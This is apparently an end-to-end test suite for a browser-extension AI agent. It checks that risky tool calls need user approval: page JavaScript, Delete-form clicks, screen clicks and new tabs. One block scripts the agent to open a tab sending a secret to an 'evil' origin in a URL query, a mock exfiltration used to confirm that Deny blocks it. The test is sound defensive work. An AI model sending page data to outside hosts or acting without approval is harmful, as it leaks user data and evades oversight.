/**
 * The real chat agent end to end: real side panel UI, real agent loop and
 * tools, a scripted OpenAI-compatible model, and real pages.
 */
import assert from "node:assert/strict";
import { join } from "node:path";
import { after, before, describe, it } from "node:test";
import {
  AGENT_EXTENSION_ID,
  callToolThenReport,
  chatAndWait,
  extensionPage,
  launchBrowser,
  openSidePanel,
  restartAgent,
  startMockModel,
  startPageServer,
  startServer,
  tempDir,
  toolResults,
  writeRestartHelper,
} from "./harness.mjs";

/** A page linking to the next one, embedding a frame that never goes quiet. */
const shopPage = (n) =>
  `<!doctype html><title>Shop ${n}</title><h1>Shop ${n}</h1><a href="/shop/p${(n % 3) + 1}.html">next</a><button>Buy ${n}</button><iframe src="/busy.html"></iframe>`;

const RISKY_EXPRESSION = "document.title = 'CHANGED-BY-AGENT'; 'done'";

let browser;
let model;
let site;
let segmentsFetches = 0;
let helperDir;
/** A server on another origin that should only ever see a request after Allow. */
let evil;
const evilRequests = [];

before(async () => {
  model = await startMockModel();
  site = await startPageServer({
    "/app.html": `<!doctype html><title>Original</title><h1>App</h1>
      <iframe src="/frame.html"></iframe>
      <script>setInterval(() => fetch("/api/segments.json").catch(() => {}), 150);</script>`,
    "/frame.html": "<!doctype html><button>inside frame</button>",
    "/orders.html": `<!doctype html><title>count 0</title><h1>Orders</h1>
      <form action="/orders/delete" method="post" onsubmit="event.preventDefault(); window.n = (window.n || 0) + 1; document.title = 'count ' + window.n">
        <button type="submit">Delete</button>
      </form>
      <button onclick="document.title = 'details shown'">Show details</button>`,
    "/full-delete.html": `<!doctype html><title>count 0</title>
      <form action="/orders/delete" method="post" onsubmit="event.preventDefault(); window.n = (window.n || 0) + 1; document.title = 'count ' + window.n">
        <button type="submit" style="position:fixed;inset:0;width:100vw;height:100vh">Delete</button>
      </form>`,
    "/shop/p1.html": shopPage(1),
    "/shop/p2.html": shopPage(2),
    "/shop/p3.html": shopPage(3),
    "/busy.html":
      "<!doctype html><div id=t></div><script>setInterval(() => { document.getElementById('t').textContent = Date.now(); }, 50);</script>",
    "/api/segments.json": () => {
      segmentsFetches += 1;
      return JSON.stringify({ segments: [{ id: 1, name: "sales" }] });
    },
  });
  evil = await startServer((req, res) => {
    evilRequests.push(req.url);
    res
      .writeHead(200, { "content-type": "text/html" })
      .end("<title>evil</title>");
  });
  helperDir = writeRestartHelper(join(tempDir("apty-e2e-helper-"), "helper"));
  browser = await launchBrowser({ extraExtensions: [helperDir] });
});

after(async () => {
  await browser?.close();
  model?.close();
  site?.close();
  evil?.close();
});

async function openApp() {
  const page = await browser.context.newPage();
  await page.goto(`${site.origin}/app.html`);
  return page;
}

/** The tool result the model received in the latest turn. */
function lastToolResult() {
  return toolResults(model.requests.at(-1)).at(-1);
}

/** Wait for the approval prompt and click `button` on it. */
function answerPrompt(panel, button) {
  return async () => {
    const prompt = panel.getByRole("alertdialog");
    await prompt.waitFor({ timeout: 30_000 });
    await prompt.getByRole("button", { name: button }).click();
  };
}

async function updateSettings(panel, patch) {
  await panel.evaluate(async (patch) => {
    const { apty_settings } = await chrome.storage.local.get("apty_settings");
    await chrome.storage.local.set({
      apty_settings: { ...apty_settings, ...patch },
    });
  }, patch);
}

describe("chat agent in a real browser", () => {
  it("loads with the pinned extension id", () => {
    assert.equal(browser.extensionId, AGENT_EXTENSION_ID);
  });

  it("never offers the model a tool that approves risky actions", async () => {
    const app = await openApp();
    const panel = await openSidePanel(browser, model, app);
    model.script(() => ({ text: "RESULT: nothing to do" }));

    await chatAndWait(
      panel,
      "run a console command and check the network request",
    );

    const offered = model.requests[0].tools.map((t) => t.function.name);
    assert.ok(offered.includes("run_console_command"));
    assert.ok(!offered.includes("confirm_risky_action"));
    await panel.close();
    await app.close();
  });

  it("runs page JavaScript only after the user clicks Allow", async () => {
    const app = await openApp();
    const panel = await openSidePanel(browser, model, app);
    model.script(
      callToolThenReport("run_console_command", {
        expression: RISKY_EXPRESSION,
      }),
    );

    await chatAndWait(panel, "run a console command to change the title", {
      whileWaiting: async () => {
        const prompt = panel.getByRole("alertdialog");
        await prompt.waitFor({ timeout: 30_000 });
        const text = await prompt.innerText();
        assert.match(text, /run_console_command/);
        assert.match(text, /CHANGED-BY-AGENT/);
        assert.equal(await app.title(), "Original");
        await prompt.getByRole("button", { name: "Allow once" }).click();
      },
    });

    assert.equal(await app.title(), "CHANGED-BY-AGENT");
    assert.equal(
      lastToolResult().success,
      true,
      JSON.stringify(lastToolResult()),
    );
    await panel.close();
    await app.close();
  });

  it("never runs page JavaScript when the user clicks Deny", async () => {
    const app = await openApp();
    const panel = await openSidePanel(browser, model, app);
    model.script(
      callToolThenReport("run_console_command", {
        expression: RISKY_EXPRESSION,
      }),
    );

    await chatAndWait(panel, "run a console command to change the title", {
      whileWaiting: answerPrompt(panel, "Deny"),
    });

    assert.equal(await app.title(), "Original");
    assert.equal(lastToolResult().status, "denied");
    assert.equal(lastToolResult().reason, "user_denied");
    await panel.close();
    await app.close();
  });

  it("refuses an approved action when the tab moved to another site meanwhile", async () => {
    const app = await openApp();
    const panel = await openSidePanel(browser, model, app);
    model.script(
      callToolThenReport("run_console_command", {
        expression: RISKY_EXPRESSION,
      }),
    );

    await chatAndWait(panel, "run a console command to change the title", {
      whileWaiting: async () => {
        const prompt = panel.getByRole("alertdialog");
        await prompt.waitFor({ timeout: 30_000 });
        await app.goto(
          site.origin.replace("127.0.0.1", "localhost") + "/app.html",
        );
        await prompt.getByRole("button", { name: "Allow once" }).click();
      },
    });

    assert.equal(await app.title(), "Original");
    assert.equal(lastToolResult().reason, "page_changed");
    await panel.close();
    await app.close();
  });

  it("never remembers run_console_command: it asks every time and lists no grant", async () => {
    const app = await openApp();
    const panel = await openSidePanel(browser, model, app);

    model.script(
      callToolThenReport("run_console_command", { expression: "1 + 1" }),
    );
    await chatAndWait(panel, "run a console command", {
      whileWaiting: async () => {
        const prompt = panel.getByRole("alertdialog");
        await prompt.waitFor({ timeout: 30_000 });
        assert.equal(
          await prompt
            .getByRole("button", { name: /Allow on this site/ })
            .count(),
          0,
        );
        await prompt.getByRole("button", { name: "Allow once" }).click();
      },
    });
    assert.equal(
      lastToolResult().success,
      true,
      JSON.stringify(lastToolResult()),
    );

    model.script(
      callToolThenReport("run_console_command", {
        expression: "document.title = 'NOT-REMEMBERED'",
      }),
    );
    await chatAndWait(panel, "run a console command again", {
      whileWaiting: answerPrompt(panel, "Deny"),
    });
    assert.equal(await app.title(), "Original");

    const options = await extensionPage(browser);
    await options.getByText("Remembered approvals").waitFor();
    assert.equal(await options.getByText(/run_console_command/).count(), 0);
    await options.close();
    await panel.close();
    await app.close();
  });

  it("captures network requests without bodies unless Data handling allows them", async () => {
    const app = await openApp();
    const panel = await openSidePanel(browser, model, app);

    const capture = async (prompt) => {
      model.script(async (request) => {
        const results = toolResults(request);
        if (results.length === 0)
          return { tool: "start_network_capture", args: {} };
        if (results.length === 1) {
          const before = segmentsFetches;
          while (segmentsFetches < before + 4) {
            await new Promise((r) => setTimeout(r, 100));
          }
          return { tool: "stop_network_capture", args: {} };
        }
        return { text: "RESULT: captured" };
      });
      await app.bringToFront();
      await chatAndWait(panel, prompt);
      const [started, stopped] = toolResults(model.requests.at(-1));
      return {
        bodiesCaptured: started.session.bodiesCaptured,
        segments: stopped.requests.filter((r) =>
          r.url.includes("segments.json"),
        ),
      };
    };

    const off = await capture("capture the network requests");
    assert.equal(off.bodiesCaptured, false);
    assert.ok(off.segments.length > 0);
    assert.ok(off.segments.every((r) => r.bodyPreview === undefined));

    await updateSettings(panel, { networkBodyCaptureEnabled: true });
    const on = await capture("capture the network requests again");
    assert.equal(on.bodiesCaptured, true);
    assert.ok(
      on.segments.some((r) => r.bodyPreview?.includes("sales")),
      JSON.stringify(on.segments.slice(0, 2)),
    );

    await updateSettings(panel, {
      networkBodyCaptureDenyList: ["/api/segments"],
    });
    const denied = await capture("capture the network requests one more time");
    assert.equal(denied.bodiesCaptured, true);
    assert.ok(denied.segments.length > 0);
    assert.ok(denied.segments.every((r) => r.bodyPreview === undefined));
    await panel.close();
    await app.close();
  });

  it("logs no errors in the side panel during a chat", async () => {
    const app = await openApp();
    const panel = await openSidePanel(browser, model, app);
    model.script(() => ({ text: "RESULT: hello" }));

    await chatAndWait(panel, "what is on this page");

    assert.deepEqual(panel.consoleErrors, []);
    await panel.close();
    await app.close();
  });

  it("shows the working border on the page only while the agent replies", async () => {
    const app = await openApp();
    const pageErrors = [];
    app.on("console", (m) => {
      if (m.type() === "error") pageErrors.push(m.text());
    });
    const panel = await openSidePanel(browser, model, app);
    let release;
    const replied = new Promise((r) => {
      release = r;
    });
    model.script(async () => {
      await replied;
      return { text: "RESULT: done thinking" };
    });

    const border = app.locator("#apty-agent-border-overlay > div");
    await chatAndWait(panel, "what is on this page", {
      whileWaiting: async () => {
        await border.first().waitFor({ timeout: 15_000 });
        release();
      },
    });
    await border.first().waitFor({ state: "detached", timeout: 15_000 });

    assert.deepEqual(
      pageErrors.filter((e) => /storage/i.test(e)),
      [],
      "the page's content script must not touch extension storage",
    );
    await panel.close();
    await app.close();
  });

  it("does not let an iframe that never goes quiet stall an application audit", async () => {
    const shop = await browser.context.newPage();
    await shop.goto(`${site.origin}/shop/p1.html`);
    const panel = await openSidePanel(browser, model, shop);
    model.script(
      callToolThenReport("run_application_dom_health_audit", {
        maxPages: 3,
        discoveryMode: "application-safe",
      }),
    );

    const started = Date.now();
    // An application run asks first (S5; link-only too since Phase 4).
    await chatAndWait(panel, "check dom health across the whole application", {
      timeout: 120_000,
      whileWaiting: async () => {
        const prompt = panel.getByRole("alertdialog");
        await prompt.waitFor({ timeout: 30_000 });
        await prompt.getByRole("button", { name: "Allow once" }).click();
      },
    });

    // About 7s; waiting out every stability timeout on the busy frame took 30s.
    assert.ok(Date.now() - started < 15_000, `took ${Date.now() - started}ms`);
    assert.match(JSON.stringify(lastToolResult()), /"pagesAudited":3/);
    await panel.close();
    await shop.close();
  });

  it("audits DOM Health on a tab opened before the extension restarted", async () => {
    const app = await openApp();
    await restartAgent(browser, helperDir);

    const probe = await extensionPage(browser);
    const stale = await probe.evaluate(async () => {
      const [tab] = await chrome.tabs.query({
        url: "http://127.0.0.1/*app.html",
      });
      try {
        await chrome.tabs.sendMessage(
          tab.id,
          { request: "dom-health-ping" },
          { frameId: 0 },
        );
        return "answered";
      } catch (error) {
        return String(error);
      }
    });
    await probe.close();
    assert.match(
      stale,
      /Receiving end does not exist/,
      "old content scripts should be orphaned",
    );

    const panel = await openSidePanel(browser, model, app);
    model.script(callToolThenReport("run_dom_health_audit", {}));
    await chatAndWait(panel, "check dom health of this page", {
      timeout: 90_000,
    });

    const text = JSON.stringify(lastToolResult());
    assert.match(text, /"framesFailed":0\b/, text.slice(0, 800));
    assert.match(text, /"framesAccessible":2\b/, text.slice(0, 800));
    await panel.close();
    await app.close();
  });
});

/**
 * Run `steps` as consecutive tool calls in one chat turn on `path`. Each step
 * is `(previousResults) => ({ tool, args })`.
 */
async function runGatedSteps(path, prompt, steps, whileWaiting, settings) {
  const app = await browser.context.newPage();
  await app.goto(`${site.origin}${path}`);
  const panel = await openSidePanel(browser, model, app, settings);
  // Count this turn's tool calls rather than tool messages: a screenshot
  // sent to the model arrives as a new user message, which resets
  // `toolResults`.
  model.script((request) => {
    const turn = messagesSincePrompt(request, prompt);
    if (!turn) return { text: "unrelated request" };
    const index = turn.filter(
      (m) => m.role === "assistant" && m.tool_calls,
    ).length;
    const step = steps[index]?.(toolResultsSincePrompt(request, prompt));
    if (!step) {
      return {
        text: `RESULT: ${JSON.stringify(toolResults(request).at(-1)).slice(0, 300)}`,
      };
    }
    const offered = (request.tools ?? []).map((t) => t.function.name);
    if (!offered.includes(step.tool)) {
      return { text: `RESULT: ${step.tool} was not offered for this request` };
    }
    return step;
  });
  await chatAndWait(panel, prompt, {
    timeout: 120_000,
    whileWaiting: whileWaiting?.(panel),
  });
  const results = toolResultsSincePrompt(model.requests.at(-1), prompt);
  assert.equal(
    results.length,
    steps.length,
    await panel.locator("body").innerText(),
  );
  return { app, panel, results };
}

/** The messages after the user message that sent `prompt`, or null when it is not in `request`. */
function messagesSincePrompt(request, prompt) {
  const messages = request.messages ?? [];
  const start = messages.findLastIndex(
    (m) =>
      m.role === "user" &&
      (typeof m.content === "string"
        ? m.content
        : JSON.stringify(m.content)
      ).includes(prompt),
  );
  return start === -1 ? null : messages.slice(start + 1);
}

/** Every tool result after the user message that sent `prompt`. */
function toolResultsSincePrompt(request, prompt) {
  return (messagesSincePrompt(request, prompt) ?? [])
    .filter((m) => m.role === "tool")
    .map((m) => {
      const text =
        typeof m.content === "string" ? m.content : JSON.stringify(m.content);
      try {
        return JSON.parse(text);
      } catch {
        return text;
      }
    });
}

function findUid(searchResult, label) {
  const text =
    typeof searchResult === "string"
      ? searchResult
      : JSON.stringify(searchResult);
  const line = text.split(/\\n|\n/).find((l) => l.includes(label));
  return line?.match(/uid=([\w-]+)/)?.[1] ?? line?.match(/\[([\w-]+)\]/)?.[1];
}

const tabIdOf = (tab) => tab.tab?.id ?? tab.id;

/** Steps that find `label` on the current tab and click it. */
function clickSteps(label) {
  return [
    () => ({ tool: "get_current_tab", args: {} }),
    ([tab]) => ({
      tool: "search_elements",
      args: { tabId: tabIdOf(tab), query: label, contextLevels: 0 },
    }),
    ([tab, search]) => ({
      tool: "click",
      args: {
        tabId: tabIdOf(tab),
        uid: findUid(search, label),
        dblClick: false,
      },
    }),
  ];
}

/** Answer the approval prompt with `button` after checking its text. */
function answerGate(button, check) {
  return (panel) => async () => {
    const prompt = panel.getByRole("alertdialog");
    await prompt.waitFor({ timeout: 60_000 });
    await check?.(await prompt.innerText(), prompt);
    await prompt.getByRole("button", { name: button }).click();
  };
}

describe("approval for clicks and new tabs (A1)", () => {
  const secret = "s".repeat(200);

  it("never opens a tab carrying page data to another origin when the user clicks Deny", async () => {
    const exfil = `${evil.origin}/?d=${secret}`;
    const { app, panel, results } = await runGatedSteps(
      "/app.html",
      "open a new tab with the help page",
      [() => ({ tool: "create_new_tab", args: { url: exfil } })],
      answerGate("Deny", async (text, prompt) => {
        assert.match(text, /create_new_tab/);
        assert.ok(text.includes(secret), "the prompt shows the full URL");
        assert.equal(
          await prompt
            .getByRole("button", { name: /Allow on this site/ })
            .count(),
          0,
          "a URL carrying data is never remembered",
        );
      }),
    );

    assert.equal(results[0].status, "denied");
    await new Promise((r) => setTimeout(r, 500));
    assert.deepEqual(evilRequests, []);
    await panel.close();
    await app.close();
  });

  it("opens that tab only after Allow once", async () => {
    const exfil = `${evil.origin}/?d=${secret}`;
    const { app, panel, results } = await runGatedSteps(
      "/app.html",
      "open a new tab with the help page",
      [() => ({ tool: "create_new_tab", args: { url: exfil } })],
      answerGate("Allow once"),
    );

    assert.equal(results[0].success, true, JSON.stringify(results[0]));
    const deadline = Date.now() + 10_000;
    while (evilRequests.length === 0 && Date.now() < deadline) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.ok(evilRequests.some((u) => u.includes(secret)));
    for (const page of browser.context.pages()) {
      if (page.url().startsWith(evil.origin)) await page.close();
    }
    // The opened tab's /favicon.ico can arrive after it closes; let it land
    // before clearing, so a later test doesn't count it.
    await new Promise((r) => setTimeout(r, 1500));
    evilRequests.length = 0;
    await panel.close();
    await app.close();
  });

  it("clicks a benign button with no prompt", async () => {
    const { app, panel, results } = await runGatedSteps(
      "/orders.html",
      "on the current tab, click the Show details button",
      clickSteps("Show details"),
    );

    assert.notEqual(results[2].success, false, JSON.stringify(results[2]));
    assert.equal(await app.title(), "details shown");
    assert.equal(await panel.getByRole("alertdialog").count(), 0);
    await panel.close();
    await app.close();
  });

  it("asks before clicking a Delete submit button, and Deny leaves the page unchanged", async () => {
    const { app, panel, results } = await runGatedSteps(
      "/orders.html",
      "on the current tab, click the Delete button",
      clickSteps("Delete"),
      answerGate("Deny", (text) => {
        assert.match(text, /Allow click\?/);
        assert.match(text, /Click "Delete"/);
        assert.match(text, /Form: POST .*\/orders\/delete/);
        assert.match(text, /it submits a form/);
      }),
    );

    assert.equal(results[2].status, "denied");
    assert.equal(await app.title(), "count 0");
    await panel.close();
    await app.close();
  });

  it("asks before a coordinate click on the same button", async () => {
    const { app, panel, results } = await runGatedSteps(
      "/full-delete.html",
      "take a screenshot of the current tab, then use the computer to click the middle of the page",
      [
        () => ({ tool: "capture_screenshot", args: { sendToLLM: true } }),
        () => ({
          tool: "computer",
          args: { action: "left_click", coordinate: [200, 150] },
        }),
      ],
      answerGate("Deny", (text) => {
        assert.match(text, /Allow computer\?/);
        assert.match(text, /Click "Delete"/);
      }),
      // The screenshot is a step toward the click under test, not what it
      // checks; its own consent prompt is covered in llm-outbound.e2e.
      { screenshotPolicy: "allow" },
    );

    assert.equal(results[1].status, "denied", JSON.stringify(results[1]));
    assert.equal(await app.title(), "count 0");
    await panel.close();
    await app.close();
  });

  it("an 'Allow on this site' for click does not cover create_new_tab, and revoking it asks again", async () => {
    const first = await runGatedSteps(
      "/orders.html",
      "on the current tab, click the Delete button",
      clickSteps("Delete"),
      answerGate(/Allow on this site/),
    );
    assert.equal(await first.app.title(), "count 1");
    await first.panel.close();
    await first.app.close();

    const again = await runGatedSteps(
      "/orders.html",
      "on the current tab, click the Delete button again",
      clickSteps("Delete"),
    );
    assert.equal(await again.app.title(), "count 1", "remembered: no prompt");
    await again.panel.close();
    await again.app.close();

    const tab = await runGatedSteps(
      "/orders.html",
      "open a new tab with the help page",
      [
        () => ({
          tool: "create_new_tab",
          args: { url: `${evil.origin}/help` },
        }),
      ],
      answerGate("Deny", (text) => assert.match(text, /create_new_tab/)),
    );
    assert.equal(tab.results[0].status, "denied");
    assert.deepEqual(evilRequests, []);
    await tab.panel.close();
    await tab.app.close();

    const options = await extensionPage(browser);
    await options.getByText(/click/).first().waitFor();
    await options.getByRole("button", { name: "Revoke all" }).click();
    await options
      .getByRole("alertdialog", { name: "Revoke all remembered approvals?" })
      .getByRole("button", { name: "Revoke all" })
      .click();
    await options.getByText("No active approvals.").waitFor();
    await options.close();

    const revoked = await runGatedSteps(
      "/orders.html",
      "on the current tab, click the Delete button once more",
      clickSteps("Delete"),
      answerGate("Deny"),
    );
    assert.equal(revoked.results[2].status, "denied");
    assert.equal(await revoked.app.title(), "count 0");
    await revoked.panel.close();
    await revoked.app.close();
  });
});

describe("approval hardening (S5)", () => {
  it("remembering a typing approval does not pre-approve a Delete click", async () => {
    const typed = await runGatedSteps(
      "/full-delete.html",
      "use the computer to type into the page: hello",
      [() => ({ tool: "computer", args: { action: "type", text: "hello" } })],
      answerGate(/Allow on this site/, (text) => assert.match(text, /Typing/)),
    );
    assert.notEqual(typed.results[0].status, "denied");
    await typed.panel.close();
    await typed.app.close();

    const click = await runGatedSteps(
      "/full-delete.html",
      "use the computer to click the Delete button in the middle of the page",
      [
        () => ({
          tool: "computer",
          args: { action: "left_click", coordinate: [200, 200] },
        }),
      ],
      answerGate("Deny", (text) => assert.match(text, /Click/)),
    );
    assert.equal(click.results[0].status, "denied");
    assert.equal(await click.app.title(), "count 0");
    await click.panel.close();
    await click.app.close();
  });

  it("a deep DOM Health run asks once, naming the mode and page limit", async () => {
    let prompts = 0;
    const run = await runGatedSteps(
      "/shop/p1.html",
      "run an application DOM health audit across pages with deep state discovery",
      [
        () => ({
          tool: "run_application_dom_health_audit",
          args: { discoveryMode: "application-deep", maxPages: 2 },
        }),
      ],
      answerGate("Allow once", (text) => {
        prompts += 1;
        assert.match(text, /application-deep/);
        assert.match(text, /2 pages/);
      }),
    );
    assert.equal(prompts, 1);
    assert.notEqual(run.results[0].status, "denied");
    assert.equal(await run.panel.getByRole("alertdialog").count(), 0);
    await run.panel.close();
    await run.app.close();
  });
});
